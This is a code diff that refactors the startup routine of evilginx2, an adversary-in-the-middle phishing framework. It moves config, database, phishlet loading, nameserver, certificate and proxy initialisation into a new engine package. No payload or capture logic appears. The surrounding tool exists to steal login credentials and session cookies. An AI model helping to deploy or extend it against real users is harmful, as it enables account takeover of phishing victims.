@@ -7,16 +7,11 @@ import (
 	"os"
 	"os/user"
 	"path/filepath"
-	"regexp"
-	"strings"
-
-	"github.com/caddyserver/certmagic"
-	"github.com/kgretzky/evilginx2/core"
-	"github.com/kgretzky/evilginx2/database"
-	"github.com/kgretzky/evilginx2/log"
-	"go.uber.org/zap"
 
 	"github.com/fatih/color"
+	"github.com/kgretzky/evilginx2/core"
+	"github.com/kgretzky/evilginx2/engine"
+	"github.com/kgretzky/evilginx2/log"
 )
 
 var phishlets_dir = flag.String("p", "", "Phishlets directory path")
@@ -66,8 +61,6 @@ func main() {
 	showAd()
 
 	_log.SetOutput(log.NullLogger().Writer())
-	certmagic.Default.Logger = zap.NewNop()
-	certmagic.DefaultACME.Logger = zap.NewNop()
 
 	if *phishlets_dir == "" {
 		*phishlets_dir = joinPath(exe_dir, "./phishlets")
@@ -101,8 +94,7 @@ func main() {
 		log.Info("debug output enabled")
 	}
 
-	phishlets_path := *phishlets_dir
-	log.Info("loading phishlets from: %s", phishlets_path)
+	log.Info("loading phishlets from: %s", *phishlets_dir)
 
 	if *cfg_dir == "" {
 		usr, err := user.Current()
@@ -113,91 +105,28 @@ func main() {
 		*cfg_dir = filepath.Join(usr.HomeDir, ".evilginx")
 	}
 
-	config_path := *cfg_dir
-	log.Info("loading configuration from: %s", config_path)
+	log.Info("loading configuration from: %s", *cfg_dir)
 
-	err := os.MkdirAll(*cfg_dir, os.FileMode(0700))
+	eng, err := engine.New(engine.Options{
+		PhishletsDir:   *phishlets_dir,
+		RedirectorsDir: *redirectors_dir,
+		ConfigDir:      *cfg_dir,
+		GophishDB:      *gophish_db,
+		Turnstile:      *turnstile,
+		Developer:      *developer_mode,
+		FeedEnabled:    *feed_enabled,
+	})
 	if err != nil {
 		log.Fatal("%v", err)
 		return
 	}
 
-	crt_path := joinPath(*cfg_dir, "./crt")
-
-	cfg, err := core.NewConfig(*cfg_dir, "")
-	if err != nil {
-		log.Fatal("config: %v", err)
-		return
-	}
-	cfg.SetRedirectorsDir(*redirectors_dir)
-
-	db, err := database.NewDatabase(filepath.Join(*cfg_dir, "data.db"))
-	if err != nil {
-		log.Fatal("database: %v", err)
+	if err := eng.Start(); err != nil {
+		log.Fatal("%v", err)
 		return
 	}
 
-	err = database.SetupGPDB(*gophish_db)
-	if err != nil {
-		log.Fatal("database: %v", err)
-		return
-	}
-
-	bl, err := core.NewBlacklist(filepath.Join(*cfg_dir, "blacklist.txt"))
-	if err != nil {
-		log.Error("blacklist: %s", err)
-		return
-	}
-
-	files, err := os.ReadDir(phishlets_path)
-	if err != nil {
-		log.Fatal("failed to list phishlets directory '%s': %v", phishlets_path, err)
-		return
-	}
-	for _, f := range files {
-		if !f.IsDir() {
-			pr := regexp.MustCompile(`([a-zA-Z0-9\-\.]*)\.yaml`)
-			rpname := pr.FindStringSubmatch(f.Name())
-			if rpname == nil || len(rpname) < 2 {
-				continue
-			}
-			pname := rpname[1]
-			if pname != "" {
-				pl, err := core.NewPhishlet(pname, filepath.Join(phishlets_path, f.Name()), nil, cfg)
-				if err != nil {
-					log.Error("failed to load phishlet '%s': %v", f.Name(), err)
-					continue
-				}
-				cfg.AddPhishlet(pname, pl)
-			}
-		}
-	}
-	cfg.LoadSubPhishlets()
-	cfg.CleanUp()
-
-	ns, _ := core.NewNameserver(cfg)
-	ns.Start()
-
-	crt_db, err := core.NewCertDb(crt_path, cfg, ns)
-	if err != nil {
-		log.Fatal("certdb: %v", err)
-		return
-	}
-
-	var hp *core.HttpProxy
-
-	if *turnstile != "" {
-		turnstileParts := strings.Split(*turnstile, ":")
-		hs, _ := core.NewHttpServer(turnstileParts[0], turnstileParts[1], true)
-		hp, _ = core.NewHttpProxy(cfg.GetServerBindIP(), cfg.GetHttpsPort(), cfg, crt_db, db, bl, *developer_mode, *feed_enabled, true)
-		hs.Start(hp)
-	} else {
-		hp, _ = core.NewHttpProxy(cfg.GetServerBindIP(), cfg.GetHttpsPort(), cfg, crt_db, db, bl, *developer_mode, *feed_enabled, false)
-	}
-
-	hp.Start()
-
-	t, err := core.NewTerminal(hp, cfg, crt_db, db, *developer_mode)
+	t, err := core.NewTerminal(eng.Proxy, eng.Cfg, eng.CertDB, eng.DB, *developer_mode)
 	if err != nil {
 		log.Fatal("%v", err)
 		return
